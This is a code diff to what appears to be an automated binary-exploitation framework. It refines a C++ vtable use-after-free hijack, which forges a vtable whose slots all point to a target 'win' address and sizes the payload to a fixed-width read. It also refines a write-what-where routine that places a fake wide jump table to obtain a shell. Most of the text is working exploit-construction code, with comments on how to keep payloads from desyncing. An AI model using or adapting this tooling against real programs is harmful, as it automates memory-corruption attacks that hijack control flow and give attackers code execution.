@@ -680,8 +680,6 @@ def _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts,
     breakpoint is hit AND a negative control (fake vtable -> a benign address) is NOT. Returns
     (seq, new_opt, free_opt, edit_opt, show_opt, chunk, size) or None. Non-PIE."""
     from ..dynamic import heap_discover
-    from ..fuzz import menu
-    from . import exploit
     if not _is_cpp_heap(target_bytes):
         return None
     alloc_info = heap_discover._libc_plt_pair(exe)
@@ -695,8 +693,48 @@ def _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts,
     if len(cand) < 2:
         return None
 
+    # THE MENU'S OWN WIDTH, not the target's. `shared_op_model` infers ONE width for the whole
+    # program, and a C++ notebook commonly has both: the menu choice read with `scanf("%d")` or
+    # `cin >>` (line-driven) and ONE data option reading a fixed block -- `read(0, obj, 48)`, which
+    # is exactly the write this hijack needs. That single raw read made the crawl call the whole
+    # target 48-byte fixed-width, so every option selector went out padded to 48 bytes, the menu
+    # consumed one number and 46 bytes of filler desynced everything after it **[measured: the
+    # model came back {1:[],2:[],3:[],4:[]} with width=48 and the hijack never fired]**. The
+    # inference is not trusted alone: both encodings are tried, the detected one first.
+    # ...and whether the option takes an INDEX at all. A notebook with a slot table reads one
+    # (`delete(slot)`), a single-object demo reads none -- and an index sent to a program that
+    # does not read it is left in the pipe, where the next option's `read(0, obj, 48)` swallows
+    # it: the forged vtable pointer then lands two bytes into the object instead of at offset 0.
+    # Four passes at most, detected-and-indexed first, and each is bounded by its own attempt cap.
+    for sel_width in ([width] if width is None else [width, None]):
+        for send_idx in (True, False):
+            hit = _cpp_vtable_uaf_at(ctx, target, exe, functions, edges, win, cand, model,
+                                     sel_width, workdir, capture, alloc_info, send_idx,
+                                     pad_to=width)
+            if hit:
+                return hit
+    return None
+
+
+def _cpp_vtable_uaf_at(ctx, target, exe, functions, edges, win, cand, model, width, workdir,
+                       capture, alloc_info, send_idx=True, pad_to=None):
+    """One pass of `_cpp_vtable_uaf` with the option selectors encoded at `width`, sending an
+    index scalar after each selector only when `send_idx`.
+
+    `pad_to` is the FIXED-WIDTH read length the crawl detected, and the fake vtable is filled to
+    it. The blob was sized from the ALLOCATION, which is a different number: `new Derived()` asks
+    for 40 bytes and the option that overwrites it does `read(0, obj, 48)`, so a 40-byte payload
+    leaves that read eight bytes short -- it swallows the detonating option's own bytes and then
+    waits for more, and the capture comes back "no fatal signal" on a sequence that works by hand
+    **[measured]**. A fixed-width field has to be filled to its width or every later operation
+    desyncs; `menu._fill` says the same thing about size-prefixed strings."""
+    from ..fuzz import menu
+    from . import exploit
+    win_name, win_addr = win
+
     def _op(opt, idx=0):                                  # select `opt`, supply index `idx`
-        return menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width)
+        sel = menu._scalar(opt.encode(), width)
+        return sel + menu._scalar(str(idx).encode(), width) if send_idx else sel
 
     # Identify the allocating option(s) by tracing each candidate's drive once (cached).
     allocs: dict = {}
@@ -712,6 +750,7 @@ def _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts,
     attempts = 0
     for new_opt, (chunk, size) in allocs.items():
         size = max(16, min(size, 4096)) & ~0x7            # object size: edit read() consumes exactly
+        size = max(size, int(pad_to or 0))                # ...but a fixed-width read wants its WIDTH
         # fake vtable built inline in the reclaimed object: ptr at off 0 -> chunk+8, slots all win
         vtable = _p64(chunk + 8) + _p64(win_addr) * ((size - 8) // 8)
         vtable = vtable[:size].ljust(size, b"\x00")
@@ -1014,6 +1053,10 @@ def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, wid
         return None
     slots = _leak_slots(target_bytes)
     exits = _exit_sequences(opts, model, width)
+    # An array that can hold the fake wide jump table (its +0x68 word) first: the forgery then
+    # stays inside memory the bug already reaches, instead of landing past the array in whatever
+    # .bss follows it.
+    arrays = sorted(arrays, key=lambda a: 0 if int(a.get("size") or 0) >= 0x70 else 1)
     for arr in arrays:
         base, stride = arr["addr"], arr.get("stride", 8) or 8
         for writer in writers:
